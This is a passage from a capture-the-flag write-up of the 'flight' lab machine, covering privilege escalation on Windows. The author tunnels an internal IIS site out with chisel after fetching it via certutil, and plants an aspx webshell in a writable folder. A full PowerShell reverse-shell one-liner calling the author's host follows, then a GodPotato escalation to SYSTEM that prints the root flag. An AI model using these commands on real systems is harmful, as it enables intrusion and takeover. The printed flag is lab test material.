bd3fe611b5f6284e8edf97c106f1&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


after running winpeas, it turned out there was an IIS service running internally on port 8000


```bash
PS C:\Windows\Temp> netsh http show servicestate

netsh http show servicestate

Snapshot of HTTP service state (Server Session View): 
----------------------------------------------------- 

Server session ID: FF00000120000001
    Version: 1.0
    State: Active
    Properties:
        Max bandwidth: 4294967295
        Timeouts:
            Entity body timeout (secs): 120
            Drain entity body timeout (secs): 120
            Request queue timeout (secs): 120
            Idle connection timeout (secs): 120
            Header wait timeout (secs): 120
            Minimum send rate (bytes/sec): 150
    URL groups:
    URL group ID: FE00000140000001
        State: Active
        Request queue name: Request queue is unnamed.
        Properties:
            Max bandwidth: inherited
            Max connections: inherited
            Timeouts:
                Timeout values inherited
            Number of registered URLs: 2
            Registered URLs:
                HTTP://+:5985/WSMAN/
                HTTP://+:47001/WSMAN/

Server session ID: FD00000120000001
    Version: 2.0
    State: Active
    Properties:
        Max bandwidth: 4294967295
        Timeouts:
            Entity body timeout (secs): 120
            Drain entity body timeout (secs): 120
            Request queue timeout (secs): 65535
            Idle connection timeout (secs): 120
            Header wait timeout (secs): 120
            Minimum send rate (bytes/sec): 240
    URL groups:
    URL group ID: FC00000140000001
        State: Active
        Request queue name: DefaultAppPool
        Properties:
            Max bandwidth: inherited
            Max connections: 4294967295
            Timeouts:
                Entity body timeout (secs): 120
                Drain entity body timeout (secs): 120
                Request queue timeout (secs): 65535
                Idle connection timeout (secs): 120
                Header wait timeout (secs): 0
                Minimum send rate (bytes/sec): 0
            Logging information:
                Log directory: C:\inetpub\logs\LogFiles\W3SVC1
                Log format: 0
            Authentication Configuration:
                Authentication schemes enabled:
            Number of registered URLs: 1
            Registered URLs:
                HTTP://127.0.0.1:8000:127.0.0.1/

Request queues:
    Request queue name: Request queue is unnamed.
        Version: 1.0
        State: Active
        Request queue 503 verbosity level: Basic
        Max requests: 1000
        Number of active processes attached: 1
        Process IDs:
            3432

    Request queue name: DefaultAppPool
        Version: 2.0
        State: Active
        Request queue 503 verbosity level: Limited
        Max requests: 1000
        Number of active processes attached: 0
        Controller process ID: 3356
        Process IDs:
```


now im gonna tunnel and expose port 8000 to my machine with chisel


```bash
PS C:\Windows\Temp> certutil -urlcache -f http://10.10.17.85:9000/chisel.exe chisel.exe

PS C:\Windows\Temp> .\chisel.exe client 10.10.17.85:9001 R:8000:127.0.0.1:8000
.\chisel.exe client 10.10.17.85:9001 R:8000:127.0.0.1:8000
```


```bash
…/labs/flight 10.10.17.85 ❯ ./chisel server -p 9001 --reverse
2026/06/15 22:17:42 server: Reverse tunnelling enabled
2026/06/15 22:17:42 server: Fingerprint 01eJ9W0fpJ/GaWNymzrOIUDY3JIOohUyInf/KbcpRO8=
2026/06/15 22:17:42 server: Listening on http://0.0.0.0:9001
2026/06/15 22:18:05 server: session#1: tun: proxy#R:8000=>8000: Listening
```


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/b3c376ac-19bb-4113-9797-db95b635ed03/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TOGHPRSW%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T010132Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCCFLHl4nU%2BCvLTK9fxahP%2BdnAGlUaQI5JKc%2BqajgiYoAIhAI59lUmGKOBTZWtKy5qVFmDxSE4VW%2BBLNEAnf4S9Kdl5Kv8DCHcQABoMNjM3NDIzMTgzODA1Igz0jf6gLJbc9EKW1tsq3APtP6fyQMKHAz24eO5T%2F0kWVcwfYyvAvqAPMZ%2B97Pp8VPbgG9NpYEkNUlHkyYY3BKg%2BEAjD7UtQkvuij6jc4LABzxLPZ68mUce%2BYSvK0vPbg477x1v0ewsJz0CJu2u%2F1QQ0d9IqN1w6YzqdRXrDXcFlpkSnI71CThGL7DMVVI3mgwixgJOEo6xKturSh5Fhnwi9fNI3goMlBTDqspbaWw03LRxplsbjwV5uvoEdFc1H%2FvWR37Urai1J0WxOVshb1UcZO3EbvPGMID70tD4WLSE3YD0b0L3imuBqaTfe9BavhX7SZehGjqlHNAo2O%2F6pNctcwT8b3xgwehF2ODWi5P7CyK1l%2Bl%2F%2F%2BVNPQNtwmntXLGXGKQ%2FPjlx2r3FzFk8bpxCMHCb3YItYy7Dblqz%2F5mBotmSYnIwPLJg3BUpjB9Rv3%2FAYaRff%2FlzjIpBv2a%2BX9ZXs3vXiZqzGtgnPIdrUMW9OgdvPQlwYr5R039ctjEMtJ6rWoeXwqLNZy7yuORZigfTadxJ9Dzs4ZOPPtamHqx40vOWmx0gaKSkcmyW9%2Fat2n0mYJvF78DGkuh3Wgmswc6on8q7S%2BHl1p%2BgDZvkSXT6XTUpB38fEfSpLk77kDfyGDlRyjF1z0db%2BjcT8uTCa3rXSBjqkAXVOECRr7PbE9u3LupVEVvY%2FDJBp0MQUURgaPjr3zeuzkYzMU5UFYC5IoQ1cUTTkk0mwuvtrOXpqhSiPiJbBKEuIuzjEMg8TpUxsmXCRhU8yhE3LrEGDTjsUJYKhHTyZDZqWIa1dM1cr5htaMZgWP5Vw9kjcWruIcpPRbXBonOWMwC1vHe7Vu0oisjrsGPp6esCANjcKMHtdB5tlR5zHg2dsQw57&X-Amz-Signature=8e867a7112cc3a5ee671d4214e209c71ad708629b37fc0aa38424201ec18af0e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


the site doesn’t seem to have much to it, basic IIS site for flight ticket ordering, lets check the system files, and if we can write to that directory, maybe we can drop an aspx shell


```bash
PS C:\inetpub> dir


    Directory: C:\inetpub


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        9/22/2022  12:24 PM                custerr                                                               
d-----        6/15/2026   9:22 PM                development                                                           
d-----        9/22/2022   1:08 PM                history                                                               
d-----        9/22/2022  12:32 PM                logs                                                                  
d-----        9/22/2022  12:24 PM                temp                                                                  
d-----        9/22/2022  12:28 PM                wwwroot
```


it appears the site we’re after is in the development folder, hence why its internal, lets check the ACLs, and see wether we’re allowed to write to it


```bash
icacls "C:\inetpub\development" | findstr -i "c.bum WebDevs Users Everyone"
C:\inetpub\development flight\c.bum:(OI)(CI)(W)
                       BUILTIN\Users:(I)(RX)
                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
```


`Cbum` has Write access, NIICE!!!


i uploaded an `antak.aspx` webshell, reminds me of HTB academy days


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/4731b32a-af7b-4bfd-b162-f1a99941cb91/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TOGHPRSW%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T010132Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCCFLHl4nU%2BCvLTK9fxahP%2BdnAGlUaQI5JKc%2BqajgiYoAIhAI59lUmGKOBTZWtKy5qVFmDxSE4VW%2BBLNEAnf4S9Kdl5Kv8DCHcQABoMNjM3NDIzMTgzODA1Igz0jf6gLJbc9EKW1tsq3APtP6fyQMKHAz24eO5T%2F0kWVcwfYyvAvqAPMZ%2B97Pp8VPbgG9NpYEkNUlHkyYY3BKg%2BEAjD7UtQkvuij6jc4LABzxLPZ68mUce%2BYSvK0vPbg477x1v0ewsJz0CJu2u%2F1QQ0d9IqN1w6YzqdRXrDXcFlpkSnI71CThGL7DMVVI3mgwixgJOEo6xKturSh5Fhnwi9fNI3goMlBTDqspbaWw03LRxplsbjwV5uvoEdFc1H%2FvWR37Urai1J0WxOVshb1UcZO3EbvPGMID70tD4WLSE3YD0b0L3imuBqaTfe9BavhX7SZehGjqlHNAo2O%2F6pNctcwT8b3xgwehF2ODWi5P7CyK1l%2Bl%2F%2F%2BVNPQNtwmntXLGXGKQ%2FPjlx2r3FzFk8bpxCMHCb3YItYy7Dblqz%2F5mBotmSYnIwPLJg3BUpjB9Rv3%2FAYaRff%2FlzjIpBv2a%2BX9ZXs3vXiZqzGtgnPIdrUMW9OgdvPQlwYr5R039ctjEMtJ6rWoeXwqLNZy7yuORZigfTadxJ9Dzs4ZOPPtamHqx40vOWmx0gaKSkcmyW9%2Fat2n0mYJvF78DGkuh3Wgmswc6on8q7S%2BHl1p%2BgDZvkSXT6XTUpB38fEfSpLk77kDfyGDlRyjF1z0db%2BjcT8uTCa3rXSBjqkAXVOECRr7PbE9u3LupVEVvY%2FDJBp0MQUURgaPjr3zeuzkYzMU5UFYC5IoQ1cUTTkk0mwuvtrOXpqhSiPiJbBKEuIuzjEMg8TpUxsmXCRhU8yhE3LrEGDTjsUJYKhHTyZDZqWIa1dM1cr5htaMZgWP5Vw9kjcWruIcpPRbXBonOWMwC1vHe7Vu0oisjrsGPp6esCANjcKMHtdB5tlR5zHg2dsQw57&X-Amz-Signature=d180e8da65159c0be6a863cef1ba6288e23062dbff294603ecf7ba88f6300fc9&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


shell as a virtual service account `iis apppool\defaultapppool` 


sweeet! those usually have SeImpersonate privilege, lets check it out 


```bash
Welcome to Antak - A Webshell which utilizes PowerShell
Use help for more details.
Use clear to clear the screen.
PS> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```


it DOES, great, now, for stability purposes, ill get a revshell with this virtual service account first


```bash
$client = New-Object System.Net.Sockets.TCPClient('10.10.17.85',4447);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


```bash
~ 10.10.17.85 ❯ rlwrap nc -lvnp 4447
Listening on 0.0.0.0 4447
Connection received on 10.129.228.120 51140

PS C:\windows\system32\inetsrv>
```


now ill just run godpotato from this shell


```bash
PS C:\Windows\Temp> .\gp.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
[*] CombaseModule: 0x140731970027520
[*] DispatchTable: 0x140731972333632
[*] UseProtseqFunction: 0x140731971710160
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\9d818062-3921-4e46-b0cd-b0efe1959a73\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000a002-15c0-ffff-1884-cff38f61c0d3
[*] DCOM obj OXID: 0x5637b941a17f7b57
[*] DCOM obj OID: 0xd08162034a24cd01
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 920 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1608
b623cea631e15177372db7fd44348bc3
```


and we got ROOT FLAG, THAT WAS A RIDE, GREAT CHALLENGE


shoutout to my python server !!


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/45270ed7-5621-4002-af56-4d488a532e31/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TOGHPRSW%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T010132Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCCFLHl4nU%2BCvLTK9fxahP%2BdnAGlUaQI5JKc%2BqajgiYoAIhAI59lUmGKOBTZWtKy5qVFmDxSE4VW%2BBLNEAnf4S9Kdl5Kv8DCHcQABoMNjM3NDIzMTgzODA1Igz0jf6gLJbc9EKW1tsq3APtP6fyQMKHAz24eO5T%2F0kWVcwfYyvAvqAPMZ%2B97Pp8VPbgG9NpYEkNUlHkyYY3BKg%2BEAjD7UtQkvuij6jc4LABzxLPZ68mUce%2BYSvK0vPbg477x1v0ewsJz0CJu2u%2F1QQ0d9IqN1w6YzqdRXrDXcFlpkSnI71CThGL7DMVVI3mgwixgJOEo6xKturSh5Fhnwi9fNI3goMlBTDqspbaWw03LRxplsbjwV5uvoEdFc1H%2FvWR37Urai1J0WxOVshb1UcZO3EbvPGMID70tD4WLSE3YD0b0L3imuBqaTfe9BavhX7SZehGjqlHNAo2O%2F6pNctcwT8b3xgwehF2ODWi5P7CyK1l%2Bl%2F%2F%2BVNPQNtwmntXLGXGKQ%2FPjlx2r3FzFk8bpxCMHCb3YItYy7Dblqz%2F5mBotmSYnIwPLJg3BUpjB9Rv3%2FAYaRff%2FlzjIpBv2a%2BX9ZXs3vXiZqzGtgnPIdrUMW9OgdvPQlwYr5R039ctjEMtJ6rWoeXwqLNZy7yuORZigfTadxJ9Dzs4ZOPPtamHqx40vOWmx0gaKSkcmyW9%2Fat2n0mYJvF78DGkuh3Wgmswc6on8q7S%2BHl1p%2BgDZvkSXT6XTUpB38fEfSpLk77kDfyGDlRyjF1z0db%2BjcT8uTCa3rXSBjqkAXVOECRr7PbE9u3LupVEVvY%2FDJBp0MQUURgaPjr3zeuzkYzMU5UFYC5IoQ1cUTTkk0mwuvtrOXpqhSiPiJbBKEuIuzjEMg8TpUxsmXCRhU8yhE3LrEGDTjsUJYKhHTyZDZqWIa1dM1cr5htaMZgWP5Vw9kjcWruIcpPRbXBonOWMwC1vHe7Vu0oisjrsGPp6esCANjcKMHtdB5tlR5zHg2dsQw57&X-Amz-Signature=1c4616f2da57bfcd6ba531cb5bfb20f05b00eebd7e54c65414b2cf2065066bcf&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/d94e406c-8688-4d99-9b26-ee5992a0530d/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TOGHPRSW%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T010132Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCCFLHl4nU%2BCvLTK9fxahP%2BdnAGlUaQI5JKc%2BqajgiYoAIhAI59lUmGKOBTZWtKy5qVFmDxSE4VW%2BBLNEAnf4S9Kdl5Kv8DCHcQABoMNjM3NDIzMTgzODA1Igz0jf6gLJbc9EKW1tsq3APtP6fyQMKHAz24eO5T%2F0kWVcwfYyvAvqAPMZ%2B97Pp8VPbgG9NpYEkNUlHkyYY3BKg%2BEAjD7UtQkvuij6jc4LABzxLPZ68mUce%2BYSvK0vPbg477x1v0ewsJz0CJu2u%2F1QQ0d9IqN1w6YzqdRXrDXcFlpkSnI71CThGL7DMVVI3mgwixgJOEo6xKturSh5Fhnwi9fNI3goMlBTDqspbaWw03LRxplsbjwV5uvoEdFc1H%2FvWR37Urai1J0WxOVshb1UcZO3EbvPGMID70tD4WLSE3YD0b0L3imuBqaTfe9BavhX7SZehGjqlHNAo2O%2F6pNctcwT8b3xgwehF2ODWi5P7CyK1l%2Bl%2F%2F%2BVNPQNtwmntXLGXGKQ%2FPjlx2r3FzFk8bpxCMHCb3YItYy7Dblqz%2F5mBotmSYnIwPLJg3BUpjB9Rv3%2FAYaRff%2FlzjIpBv2a%2BX9ZXs3vXiZqzGtgnPIdrUMW9OgdvPQlwYr5R039ctjEMtJ6rWoeXwqLNZy7yuORZigfTadxJ9Dzs4ZOPPtamHqx40vOWmx0gaKSkcmyW9%2Fat2n0mYJvF78DGkuh3Wgmswc6on8q7S%2BHl1p%2BgDZvkSXT6XTUpB38fEfSpLk77kDfyGDlRyjF1z0db%2BjcT8uTCa3rXSBjqkAXVOECRr7PbE9u3LupVEVvY%2FDJBp0MQUURgaPjr3zeuzkYzMU5UFYC5IoQ1cUTTkk0mwuvtrOXpqhSiPiJbBKEuIuzjEMg8TpUxsmXCRhU8yhE3LrEGDTjsUJYKhHTyZDZqWIa1dM1cr5htaMZgWP5Vw9kjcWruIcpPRbXBonOWMwC1vHe7Vu0oisjrsGPp6esCANjcKMHtdB5tlR5zHg2dsQw57&X-Amz-Signature=23a39df1ff36805ac234dd7c881b3c20035ab8cd0e6c01334bc7d4410210b1db&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

